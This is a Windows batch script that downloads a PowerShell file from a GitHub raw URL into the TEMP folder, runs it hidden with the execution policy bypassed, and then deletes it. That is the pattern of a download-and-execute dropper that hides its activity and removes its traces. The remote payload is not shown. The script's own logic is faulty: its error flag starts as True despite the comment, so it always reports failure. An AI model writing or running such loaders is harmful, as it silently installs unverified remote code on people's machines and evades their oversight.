@echo off
setlocal EnableDelayedExpansion

:: Initialize error flag to False
set "errorFlag=True"

:: Set TEMP_DIR to the TEMP folder
set TEMP_DIR=%TEMP%

:: Download the .ps1 script to the %TEMP% folder
echo Downloading script...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/madhead341/KickAss/refs/heads/main/main.ps1', '%TEMP%\script.ps1')"
if %ERRORLEVEL% neq 0 (
    echo Error downloading the script. > "%TEMP%\error.log"
    set "errorFlag=True"
    goto :end
)

:: Run the .ps1 script in a hidden window
echo Running script in background...
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\script.ps1"
if %ERRORLEVEL% neq 0 (
    echo Error running the script. > "%TEMP%\error.log"
    set "errorFlag=True"
    goto :end
)

:: Clean up the script file after execution
del "%TEMP%\script.ps1"
if %ERRORLEVEL% neq 0 (
    echo Error deleting the script file. > "%TEMP%\error.log"
    set "errorFlag=True"
    goto :end
)

:end
:: Check the status and log the result
if %errorFlag%==True (
    echo An error occurred during the process. Check error.log for details.
) else (
    echo The script ran successfully.
)

exit /b
